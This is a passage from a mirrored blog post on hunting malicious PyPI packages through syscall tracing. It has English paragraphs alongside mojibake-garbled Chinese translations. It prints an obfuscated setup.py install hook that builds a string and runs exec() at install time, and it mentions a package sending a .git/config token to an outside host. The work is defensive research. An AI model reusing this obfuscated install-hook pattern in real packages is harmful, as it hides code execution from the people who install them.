·ï¼Œæˆ‘ä»¬çš„è¾“å‡ºè®©æˆ‘ä»¬å¯¹æ­£åœ¨å‘ç”Ÿçš„äº‹æƒ…æœ‰ä¸€ä¸ªå¾ˆå¥½çš„äº†è§£ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œè¯¥åŒ…ä¼¼ä¹ä».git/configæ–‡ä»¶ä¸­æå–äº†ä¸€ä¸ªä»¤ç‰Œï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°laforge.xyzã€‚é€šè¿‡æŸ¥çœ‹setup.pyï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™æ­£æ˜¯æ­£åœ¨å‘ç”Ÿçš„äº‹æƒ…ï¼š</p><p>   The package  easyIoCtl is an interesting one. It claims to give â€œabstractions away from boring IO operationsâ€ but we see the following commands being executed:</p><p>EasyIoCtlåŒ…æ˜¯ä¸€ä¸ªæœ‰è¶£çš„åŒ…ã€‚å®ƒå£°ç§°æä¾›äº†â€œä»æ¯ç‡¥çš„IOæ“ä½œä¸­è§£è„±å‡ºæ¥çš„æŠ½è±¡â€ï¼Œä½†æˆ‘ä»¬çœ‹åˆ°ä»¥ä¸‹å‘½ä»¤æ­£åœ¨æ‰§è¡Œï¼š</p><p>  Suspicious, but not actively harmful. However, this is a  perfect example showing the power of tracing syscalls. Here is the relevant code in the projectâ€™s  setup.py:</p><p>å¯ç–‘ï¼Œä½†å¹¶ä¸æ˜¯å¾ˆæœ‰å®³ã€‚ç„¶è€Œï¼Œè¿™æ˜¯ä¸€ä¸ªå®Œç¾çš„ä¾‹å­ï¼Œå±•ç¤ºäº†è·Ÿè¸ªsyscallçš„å¨åŠ›ã€‚ä»¥ä¸‹æ˜¯é¡¹ç›®setup.pyä¸­çš„ç›¸å…³ä»£ç ï¼š</p><p> class  MyInstall ():  def  run ( self ):  control_flow_guard_controls  =  &#39; [emailÂ protected]`eBYNQ)Wg+-,ka}fM(=2v4AVp![dR/ \\ ZDF9s \x0c ~PO%yc X3UK:.w \x0b L$Ijq&lt;&amp; \r 6*? \&#39; 1&gt;mSz_^C \t o#hiJtG5xb8|; \n 7T{uH]&#34;r&#39;  control_flow_guard_mappers  =  [ 81 ,  71 ,  29 ,  78 ,  99 ,  83 ,  48 ,  78 ,  40 ,  90 ,  78 ,  40 ,  54 ,  40 ,  46 ,  40 ,  83 ,  6 ,  71 ,  22 ,  68 ,  83 ,  78 ,  95 ,  47 ,  80 ,  48 ,  34 ,  83 ,  71 ,  29 ,  34 ,  83 ,  6 ,  40 ,  83 ,  81 ,  2 ,  13 ,  69 ,  24 ,  50 ,  68 ,  11 ]  control_flow_guard_init  =  &#34;&#34;  for  controL_flow_code  in  control_flow_guard_mappers :  control_flow_guard_init  =  control_flow_guard_init  +  control_flow_guard_controls [ controL_flow_code ]  exec ( control_flow_guard_init )</p><p>ç±»MyInstall()ï¼šdef run(Self)ï¼šCONTROL_FLOW_Guard_Controls=&#39ï¼›[ç”µå­é‚®ä»¶å—ä¿æŠ¤]`eBYNQ)wg+-ï¼Œka}fm(=2v4AVpï¼[DR/\\ZDF9S\x0c~PO%YC X3UKï¼š.w\x0b L$ijq&ltï¼›&ampï¼›\r 6*ï¼Ÿ\&#39ï¼›1&gtï¼›msz_^C\t oã€‚Control_Flow_Guard_mappers=[81ï¼Œ71ï¼Œ29ï¼Œ78ï¼Œ99ï¼Œ83ï¼Œ48ï¼Œ78ï¼Œ40ï¼Œ90ï¼Œ78ï¼Œ40ï¼Œ54ï¼Œ40ï¼Œ46ï¼Œ40ï¼Œ83ï¼Œ6ï¼Œ71ï¼Œ22ï¼Œ68ï¼Œ83ï¼Œ78ï¼Œ95ï¼Œ47ï¼Œ80ï¼Œ48ï¼Œ34ï¼Œ83ï¼Œ71ï¼Œ29ï¼Œ34ï¼Œ83ï¼Œ6ï¼Œ40ï¼Œ83ï¼Œ81ï¼Œ2ï¼Œ13ï¼Œ69ï¼Œ24ï¼Œ50ï¼Œ68ï¼Œ11]CONTROL_FLOW_GROUD_INIT=&#34ï¼›&#34ï¼›å¯¹äºCONTROL_FLOW_Guard_mappersä¸­çš„CONTROL_FLOW_CODEï¼šCONTROL_FLOW_GARD_INIT=CONTROL_FLOW_Guard_init+CONTROL_FLOW_Guard_Controls[CONTROL_FLOW_CODE]EXEC(CONTROL_FLOW_ã€‚</p><p> With so much obfuscation, itâ€™s hard to tell whatâ€™s going on. Traditional static analysis might catch the call to  exec, but thatâ€™s about it.</p><p>æœ‰è¿™ä¹ˆå¤šä»¤äººå›°æƒ‘çš„äº‹æƒ…ï¼Œå¾ˆéš¾è¯´æ˜¯æ€ä¹ˆå›äº‹ã€‚ä¼ ç»Ÿçš„é™æ€åˆ†æå¯èƒ½ä¼šæ•è·å¯¹execçš„è°ƒç”¨ï¼Œä½†ä»…æ­¤è€Œå·²ã€‚</p><p> To see what this is doing, we can replace the  exec with a  print, resulting in:</p><p>è¦äº†è§£è¿™æ˜¯ä»€ä¹ˆæƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥å°†EXECæ›¿æ¢ä¸ºæŒ‡çº¹ï¼Œç»“æœæ˜¯ï¼š</p><p>  This is exactly the command we recorded, showing that even code obfuscation wonâ€™t affect our results since weâ€™re doing our monitoring at the syscall level.</p><p>è¿™æ­£æ˜¯æˆ‘ä»¬è®°å½•çš„å‘½ä»¤ï¼Œè¡¨æ˜å³ä½¿ä»£ç æ··æ·†ä¹Ÿä¸ä¼šå½±å“æˆ‘ä»¬çš„ç»“æœï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯åœ¨syscallçº§åˆ«è¿›è¡Œç›‘æ§ã€‚</p><p>  Itâ€™s worth briefly discussing what we can do when we find a malicious package. The first thing to do would be to alert the PyPI volunteers so they can take down the package. This can be done by contacting  [emailÂ protected]  1</p><p>å½“æˆ‘ä»¬å‘ç°æ¶æ„ç¨‹åºåŒ…æ—¶ï¼Œæœ‰å¿…è¦ç®€è¦è®¨è®ºä¸€ä¸‹æˆ‘ä»¬å¯ä»¥åšäº›ä»€ä¹ˆã€‚é¦–å…ˆè¦åšçš„æ˜¯æé†’PyPIå¿—æ„¿è€…ï¼Œè¿™æ ·ä»–ä»¬å°±å¯ä»¥å–ä¸‹åŒ…è£¹ã€‚è¿™å¯ä»¥é€šè¿‡è”ç³»[å—ä¿æŠ¤çš„ç”µå­é‚®ä»¶]1æ¥å®Œæˆã€‚</p><p> After that, we can look at how many times the package has been downloaded using  the PyPI public dataset on BigQuery.</p><p>ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨BigQueryä¸Šçš„PyPIå…¬å…±æ•°æ®é›†æ¥æŸ¥çœ‹åŒ…è¢«ä¸‹è½½äº†å¤šå°‘æ¬¡ã€‚</p><p> Hereâ€™s an example query to find how many times  maliciouspackage has been installed in the last 30 days:</p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹æŸ¥è¯¢ï¼Œç”¨äºäº†è§£åœ¨è¿‡å»30å¤©å†…å®‰è£…äº†å¤šå°‘æ¬¡æ¶æ„ç¨‹åºåŒ…ï¼š</p><p> # standardSQL SELECT  COUNT ( * )  AS  num_downloads FROM  ` the - psf . pypi . file_downloads ` WHERE  file . project  =  &#39;maliciouspackage&#39;  -- Only query the last 30 days of history   AND  DATE ( timestamp )  BETWEEN  DATE_SUB ( CURRENT_DATE (),  INTERVAL  30  DAY )  AND  CURRENT_DATE ())</p><p>#StandardSQL SELECT COUNT(*)as num_downages from`the-psfã€‚çš®çš®äººã€‚FILE_DOWNLOADS`WHEREæ–‡ä»¶ã€‚é¡¹ç›®=#39ï¼›æ¶æ„åŒ…--ä»…æŸ¥è¯¢DATE_SUB(CURRENT_DATE()ï¼ŒINTERVAL 30å¤©)å’ŒCURRENT_DATE()ä¹‹é—´æœ€è¿‘30å¤©çš„å†å²è®°å½•å’Œæ—¥æœŸ(æ—¶é—´æˆ³)ã€‚</p><p>    This first pass was just taking an initial look at PyPI as a whole. Looking through the data, I didnâ€™t find any packages doing significantly harmful activity that didnâ€™t also have â€œmaliciousâ€ somewhere in the name, which was good! But itâ€™s always possible I missed something, or that it would happen in the future. If youâ€™re interested in digging into the data, you can find it  here.</p><p>è¿™ç¬¬ä¸€ä¸ªè¿‡ç¨‹åªæ˜¯ä½œä¸ºä¸€ä¸ªæ•´ä½“å¯¹PyPIè¿›è¡Œäº†åˆæ­¥çš„äº†è§£ã€‚é€šè¿‡æŸ¥çœ‹æ•°æ®ï¼Œæˆ‘æ²¡æœ‰å‘ç°ä»»ä½•åœ¨åç§°ä¸­æ²¡æœ‰â€œæ¶æ„â€çš„ç¨‹åºåŒ…æœ‰æ˜æ˜¾çš„æœ‰å®³æ´»åŠ¨ï¼Œè¿™å¾ˆå¥½ï¼ä½†æ€»æœ‰å¯èƒ½æˆ‘é”™è¿‡äº†ä»€ä¹ˆï¼Œæˆ–è€…å®ƒä¼šåœ¨æœªæ¥å‘ç”Ÿã€‚å¦‚æœä½ å¯¹æŒ–æ˜æ•°æ®æ„Ÿå…´è¶£ï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ã€‚</p><p> Moving forward, Iâ€™m setting up a Lambda function to fetch the latest package changes using PyPIâ€™s  RSS feed.. Every updated package will go through the same processing and send an alert if suspicious activity is detected.</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘å°†è®¾ç½®ä¸€ä¸ªLambdaå‡½æ•°ï¼Œä»¥ä½¿ç”¨PyPIçš„RSSæè¦è·å–æœ€æ–°çš„åŒ…æ›´æ”¹ã€‚æ¯ä¸ªæ›´æ–°çš„åŒ…è£¹éƒ½ä¼šç»è¿‡ç›¸åŒçš„å¤„ç†è¿‡ç¨‹ï¼Œå¦‚æœæ£€æµ‹åˆ°å¯ç–‘æ´»åŠ¨ï¼Œå°±ä¼šå‘å‡ºè­¦æŠ¥ã€‚</p><p> I still donâ€™t like that itâ€™s possible to run arbitary commands on a userâ€™s system just by them  pip installing a package. I get that the majority of use cases are benign, but it opens up risk that must be considered. Hopefully by increasingly monitoring various package managers we can identify signs of malicious activity before it has a significant impact.</p><p>æˆ‘ä»ç„¶ä¸å–œæ¬¢ä»…ä»…é€šè¿‡ç”¨æˆ·å®‰è£…ç¨‹åºåŒ…å°±å¯ä»¥åœ¨ç”¨æˆ·ç³»ç»Ÿä¸Šè¿è¡Œä»»æ„å‘½ä»¤ã€‚æˆ‘çŸ¥é“å¤§å¤šæ•°ç”¨ä¾‹éƒ½æ˜¯è‰¯æ€§çš„ï¼Œä½†å®ƒå¸¦æ¥äº†å¿…é¡»è€ƒè™‘çš„é£é™©ã€‚å¸Œæœ›é€šè¿‡åŠ å¼ºå¯¹å„ç§åŒ…ç®¡ç†å™¨çš„ç›‘æ§ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ¶æ„æ´»åŠ¨äº§ç”Ÿé‡å¤§å½±å“ä¹‹å‰è¯†åˆ«å‡ºå…¶è¿¹è±¡ã€‚</p><p> And this isnâ€™t unique to PyPI. After this, Iâ€™m hoping to run the same analysis on RubyGems, npm, and others- much like the researchers I mentiond earlier. In the meantime, you can find all the code used to run the experiment  here and, as always, let me know if you have any questions!</p><p>è¿™å¹¶ä¸æ˜¯PyPIç‹¬æœ‰çš„ã€‚åœ¨æ­¤ä¹‹åï¼Œæˆ‘å¸Œæœ›å¯¹RubyGemsã€NPMå’Œå…¶ä»–è½¯ä»¶è¿è¡ŒåŒæ ·çš„åˆ†æ--å°±åƒæˆ‘å‰é¢æåˆ°çš„ç ”ç©¶äººå‘˜ä¸€æ ·ã€‚åŒæ—¶ï¼Œæ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ç”¨äºè¿è¡Œå®éªŒçš„æ‰€æœ‰ä»£ç ï¼Œå¦‚æœæ‚¨æœ‰ä»»ä½•é—®é¢˜ï¼Œè¯·ä¸€å¦‚æ—¢å¾€åœ°å‘Šè¯‰æˆ‘ï¼</p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/ç¨‹åº/">#ç¨‹åº</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/æ¶æ„ç¨‹åº/">#æ¶æ„ç¨‹åº</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/malicious/">#malicious</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/pypi/">#pypi</a></button></div></div><div class="shadow p-3 mb-5 bg-white rounded clearfix"><div class="container"><div class="row"><div class="col-sm"><div><a target="_blank" href="/story/1034875.html"><img src="http://img2.diglog.com/img/2020/11/thumb_70cb84755c6e1c3dba801123370378e9.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1034875.html">
PSAï¼šMacOSä»Šæ—©æœ‰ç‚¹å´©æºƒï¼Œè®¸å¤šéè‹¹æœåº”ç”¨ç¨‹åºåœ¨å‘å¸ƒæ—¶æŒ‚èµ·</a></div><span class="my_story_list_date">2020-11-13 19:7</span></div><div class="col-sm"><div><a target="_blank" href="/story/1034842.html"><img src="http://img2.diglog.com/img/2020/11/thumb_c27e6cec6debacb79347e94968d267b3.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1034842.html">è®¸å¤šMacç”¨æˆ·åœ¨Big Surå‘å¸ƒæœŸé—´é‡åˆ°äº†åº”ç”¨ç¨‹åºå‡é€Ÿçš„é—®é¢˜ï¼Œå¯èƒ½æ˜¯ç”±äºè‹¹æœçš„OCSPæœåŠ¡æ— æ³•éªŒè¯è¯ä¹¦çš„é—®é¢˜</a></div><span class="my_story_list_date">2020-11-13 19:0</span></div><div class="col-sm"><div><a target="_blank" href="/story/1034838.html"><img src="http://img2.diglog.com/img/2020/11/thumb_7e8468235bd71f2f3ee1de99a0728257.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1034838.html">è‹¹æœä¸­æ–­å½±å“Macåº”ç”¨ç¨‹åºã€Big Suræ›´æ–°ã€iMessageç­‰</a></div><span class="my_story_list_date">2020-11-13 18:55</span></div><div class="col-sm"><div><a target="_blank" href="/story/1034771.html"><img src="http://img2.diglog.com/img/2020/11/thumb_335f8e5f9f9993f06ce19d5b4508c834.png" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1034771.html">Facebooké‡æ–°è®¾è®¡äº†Instagramçš„å¸ƒå±€ï¼Œåœ¨åº”ç”¨ç¨‹åºçš„å¯¼èˆªæ ä¸­å¢åŠ äº†ä¸“é—¨çš„è´­ç‰©æ ‡ç­¾å’Œå·è½´</a></div><span class="my_story_list_date">2020-11-12 22:37</span></div></div></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è®¾è®¡/">#è®¾è®¡</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ¸¸æˆ/">#æ¸¸æˆ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/åˆ›æ„/">#åˆ›æ„</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è‹¹æœ/">#è‹¹æœ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ‘„å½±/">#æ‘„å½±</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è½¯ä»¶/">#è½¯ä»¶</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ç¾å›½/">#ç¾å›½</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å›¾ç‰‡/">#å›¾ç‰‡</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ‰‹æœº/">#æ‰‹æœº</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è§†é¢‘/">#è§†é¢‘</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å¹¿å‘Š/">#å¹¿å‘Š</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å…è´¹/">#å…è´¹</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è°·æ­Œ/">#è°·æ­Œ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ç½‘ç«™/">#ç½‘ç«™</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å¾®è½¯/">#å¾®è½¯</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ä¸‹è½½/">#ä¸‹è½½</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/éŸ³ä¹/">#éŸ³ä¹</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/linux/">#linux</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/åšå®¢/">#åšå®¢</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ç¨‹åº/">#ç¨‹åº</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è‰ºæœ¯/">#è‰ºæœ¯</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy; 2020 diglog.com </div></div></body></html>